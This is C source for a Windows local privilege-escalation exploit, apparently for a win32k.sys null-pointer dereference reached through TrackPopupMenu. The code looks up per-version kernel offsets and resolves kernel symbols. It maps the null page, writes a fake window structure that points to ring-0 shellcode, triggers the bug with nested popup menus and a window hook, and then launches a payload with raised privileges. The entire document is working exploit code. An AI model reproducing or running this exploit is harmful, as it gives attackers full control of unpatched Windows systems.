void Win32kNullPage(LPVOID lpPayload) {
	HWND hWnd;
	WNDCLASSA WndClass;
	LPBYTE promise_land = NULL;
	HMODULE hNtdll = NULL;
	HMODULE ntkrnl = NULL;
	NTSTATUS status;
	PULONG pSystemInfoBuffer = NULL;
	lZwQuerySystemInformation pZwQuerySystemInformation = NULL;
	ULONG    SystemInfoBufferSize = 0;
	char nt_name[256];
	PVOID nt_base;
	OSVERSIONINFOA VersionInformation;

	// Getting Windows version
	LogMessage("[*] Getting Windows version...");
	memset(&VersionInformation, 0, sizeof(OSVERSIONINFOA));
	VersionInformation.dwOSVersionInfoSize = 148;
	if (!GetVersionExA(&VersionInformation)) {
		LogMessage("[!] Failed to get windows version");
		return;
	}

#ifdef _M_X64
	if (VersionInformation.dwMajorVersion == 6 && VersionInformation.dwMinorVersion && VersionInformation.dwMinorVersion == 1) { // Ex: Windows 7 SP1
		LogMessage("[*] Windows 6.1 found...");
		OffsetWindows = 0x208;
	}
#else
	if (VersionInformation.dwMajorVersion == 6) {
		if (VersionInformation.dwMinorVersion && VersionInformation.dwMinorVersion == 1) { // Ex: Windows 7 SP1
			LogMessage("[*] Windows 6.1 found...");
			OffsetWindows = 0xf8;
		}
		else if (!VersionInformation.dwMinorVersion) {
			LogMessage("[*] Windows 6.0 found..."); // Ex: Windows 2008 R2
			OffsetWindows = 0xe0;
		}
		else {
			LogMessage("[!] Unsupported Windows 6.%d found, only 6.0 and 6.1 supported atm", VersionInformation.dwMinorVersion);
			return;
		}
	}
	else if (VersionInformation.dwMajorVersion == 5) {
		if (VersionInformation.dwMinorVersion && VersionInformation.dwMinorVersion == 1) { // Ex: Windows XP SP3
			LogMessage("[*] Windows 5.1 found...");
			OffsetWindows = 0xc8;
		}
		else if (VersionInformation.dwMinorVersion && VersionInformation.dwMinorVersion == 2) { // Ex: Windows 2003 SP2
			LogMessage("[*] Windows 5.2 found...");
			OffsetWindows = 0xd8;
		}
		else {
			LogMessage("[!] Unsupported Windows 5  found, only 5.1 and 5.2 supported atm");
			return;
		}
	}
#endif
	else {
		LogMessage("[!] Major Version %d found, not supported", VersionInformation.dwMajorVersion);
		return;
	}

	// Solve symbols
	LogMessage("[*] Solving symbols...");

	hNtdll = LoadLibraryA("ntdll");
	if (hNtdll == NULL) {
		LogMessage("[!] Failed to Load ntdll...");
		return;
	}

	pZwQuerySystemInformation = (lZwQuerySystemInformation)GetProcAddress(hNtdll, "ZwQuerySystemInformation");
	if (pZwQuerySystemInformation == NULL) {
		LogMessage("[!] Failed to solve ZwQuerySystemInformation");
		return;
	}

	pNtAllocateVirtualMemory = (lNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	if (pNtAllocateVirtualMemory == NULL) {
		LogMessage("[!] Failed to solve NtAllocateVirtualMemory");
		return;
	}

	LogMessage("[*] Requesting Kernel loaded modules...");

	status = pZwQuerySystemInformation(11, &SystemInfoBufferSize, 0, &SystemInfoBufferSize);

	if (SystemInfoBufferSize == 0) {
		LogMessage("[!] Requesting pZwQuerySystemInformation required length failed");
		return;
	}
	else {
		LogMessage("[*] pZwQuerySystemInformation required length %d", SystemInfoBufferSize);
	}

	pSystemInfoBuffer = (PULONG)LocalAlloc(LMEM_ZEROINIT, SystemInfoBufferSize);
	if (pSystemInfoBuffer == NULL) {
		LogMessage("[!] Allocation for SystemInfo failed");
		return;
	}

	status = pZwQuerySystemInformation(11, pSystemInfoBuffer, SystemInfoBufferSize, &SystemInfoBufferSize);

	if (status != STATUS_SUCCESS) {
		LogMessage("[!] Requesting kernel modules through ZwQuerySystemInformation failed");
		return;
	}


	LogMessage("[*] Parsing SYSTEM_INFO...");

	SYSTEM_MODULE_INFORMATION *smi = (SYSTEM_MODULE_INFORMATION *)pSystemInfoBuffer;

	LogMessage("[*] %d Kernel modules found\n", smi->ModulesCount);

	memset(nt_name, 0, 256);

	int i = 0;
	while (i < smi->ModulesCount) {
		SYSTEM_MODULE *sm = (SYSTEM_MODULE *)(smi->Modules + i);
		LogMessage("[*] Checking module %s", sm->Name);
		if (strstr((char *)sm->Name, ".exe")) {
			char *start = strstr((char *)sm->Name, "nt");
			if (start != NULL) {
				nt_base = sm->ImageBaseAddress;
				strncpy_s(nt_name, 256, start, _TRUNCATE);
				break;
			}
		}
		i++;
	}

	if (nt_name == NULL) {
		LogMessage("[!] nt not found");
		return;
	}
	else {
		LogMessage("[*] Good! nt found as %s at 0x%08x", nt_name, nt_base);
	}

	ntkrnl = LoadLibraryA(nt_name);

	LogMessage("[*] %s loaded in userspace at: %08x\n", nt_name, ntkrnl);

	pPsLookupProcessByProcessId = (lPsLookupProcessByProcessId)GetProcAddress(ntkrnl, "PsLookupProcessByProcessId");

	if (pPsLookupProcessByProcessId == NULL) {
		LogMessage("[!] Failed to solve PsLookupProcessByProcessId\n");
		return;
	}

#ifdef _M_X64
	pPsLookupProcessByProcessId = (lPsLookupProcessByProcessId)((QWORD)nt_base + ((QWORD)pPsLookupProcessByProcessId - (QWORD)ntkrnl));
	LogMessage("[*] pPsLookupProcessByProcessId in kernel: %016llx\n", pPsLookupProcessByProcessId);
#else
	pPsLookupProcessByProcessId = (lPsLookupProcessByProcessId)((DWORD)nt_base + ((DWORD)pPsLookupProcessByProcessId - (DWORD)ntkrnl));
	LogMessage("[*] pPsLookupProcessByProcessId in kernel: %08x\n", pPsLookupProcessByProcessId);
#endif

	MyProcessId = GetCurrentProcessId();

	// Register Class
	LogMessage("[*] Registering class...");

	memset(&WndClass, 0, sizeof(WNDCLASSA));
	WndClass.lpfnWndProc = WndProc; // Called with CallWindowProc => http://msdn.microsoft.com/en-us/library/windows/desktop/ms633571(v=vs.85).aspx
	WndClass.lpszClassName = "woqunimalegebi";

	if (RegisterClassA(&WndClass) == 0) {
		LogMessage("[!] RegisterClassA failed ");
		return;
	}

	// Create Window
	LogMessage("[*] Creating window...");
	hWnd = CreateWindowExA(0, "woqunimalegebi", NULL, 0, -1, -1, 0, 0, NULL, NULL, NULL, NULL);

	if (hWnd == NULL) {
		LogMessage("[!] CreateWindowExA failed");
		return;
	}

	// Making everything ready for exploitation...

	LogMessage("[*] Allocating null page...");
#ifdef _M_X64
	ULONGLONG base_address = 0x00000000fffffffb;
#else
	DWORD base_address = 1;
#endif
	SIZE_T region_size = 0x1000;
	ULONG zero_bits = 0;
	HANDLE current_process = NULL;

	current_process = GetCurrentProcess();

	if (pNtAllocateVirtualMemory(current_process, (LPVOID*)(&base_address), 0, &region_size, (MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN), PAGE_EXECUTE_READWRITE) != STATUS_SUCCESS) {
		LogMessage("[!] Failed to allocate null page");
		return;
	}

	LogMessage("[*] Getting PtiCurrent...");

#ifdef _M_X64
	ULONGLONG pti = MyPtiCurrent();
#else
	DWORD pti = MyPtiCurrent();
#endif

	if (pti == 0) {
		LoadLibrary("user32.dll");
		LoadLibrary("gdi32.dll");
		pti = MyPtiCurrent();
	}

	if (pti == 0) {
		LogMessage("[!] Filed to get PtiCurrent");
		return;
	}
	else {
#ifdef _M_X64
		LogMessage("[*] Good! pti 0x%016llx", pti);
#else
		LogMessage("[*] Good! pti 0x%08x", pti);
#endif
	}

	LogMessage("[*] Creating a fake structure at NULL...");

#ifdef _M_X64
	void *test = NULL;
	(QWORD)test = 0x10000000B;
	*((PQWORD)test) = pti;

	/* win32k!tagWND->bServerSideWindowProc = TRUE */
	(QWORD)test = 0x100000025;
	*((PBYTE)test) = 4;

	/* win32k!tagWND->lpfnWndProc = &shellcode_ring0 */
	(QWORD)test = 0x10000008B;
	*((PQWORD)test) = &shellcode_ring0;
#else
	void *test = promise_land + 3;
	/* We need to save this check, otherwise unmapped memory will be dereferenced (blue screen)
	.text:BF8B93F4 02C mov     edi, _gptiCurrent
	.text:BF8B93FA 02C cmp     edi, [esi + 8];
	.text:BF8B93FD 02C jz      loc_BF8B
	*/
	*(LPDWORD)test = pti;

	*((LPBYTE)(promise_land + 0x11)) = 0x4;

	test = promise_land + 0x5b;
	*(LPDWORD)test = (DWORD)shellcode_ring0;
#endif

	// Exploit!

	LogMessage("[*] Triggering vulnerability...");
	HMENU MenuOne = CreatePopupMenu();
	if (MenuOne == NULL) {
		LogMessage("[!] First CreatePopupMenu failed");
		return;
	}

	MENUITEMINFOA MenuOneInfo;
	memset(&MenuOneInfo, 0, sizeof(MENUITEMINFOA));
	MenuOneInfo.cbSize = sizeof(MENUITEMINFOA);
	MenuOneInfo.fMask = MIIM_STRING;

	if (InsertMenuItemA(MenuOne, 0, TRUE, &MenuOneInfo) != TRUE) {
		LogMessage("[!] First InsertMenuItemA failed");
		DestroyMenu(MenuOne);
		return;
	}

	HMENU MenuTwo = CreatePopupMenu();
	if (MenuTwo == NULL) {
		LogMessage("[!] Second CreatePopupMenu failed");
		DestroyMenu(MenuOne);
		return;
	}

	MENUITEMINFOA MenuTwoInfo;
	memset(&MenuTwoInfo, 0, sizeof(MENUITEMINFOA));
	MenuTwoInfo.cbSize = sizeof(MENUITEMINFOA);
	MenuTwoInfo.fMask = (MIIM_STRING | MIIM_SUBMENU);
	MenuTwoInfo.dwTypeData = "";
	MenuTwoInfo.cch = 1;
	MenuTwoInfo.hSubMenu = MenuOne;
	if (InsertMenuItemA(MenuTwo, 0, TRUE, &MenuTwoInfo) != TRUE) {
		LogMessage("[!] Second InsertMenuItemA failed");
		DestroyMenu(MenuTwo);
		DestroyMenu(MenuOne);
		return;
	}

	if (SetWindowsHookExA(WH_CALLWNDPROC, HookCallback, NULL, GetCurrentThreadId()) == NULL) {
		LogMessage("[!] SetWindowsHookExA failed :-(\n");
		DestroyMenu(MenuTwo);
		DestroyMenu(MenuOne);
		return;
	}

	// 'crash' it!
	TrackPopupMenu(MenuTwo, 0, -10000, -10000, 0, hWnd, NULL);

	// If everything worked process should be privileges at this point
	LogMessage("[!] Executing payload...");
	CreateThread(0, 0, ExecutePayload, lpPayload, 0, NULL);
	return;
}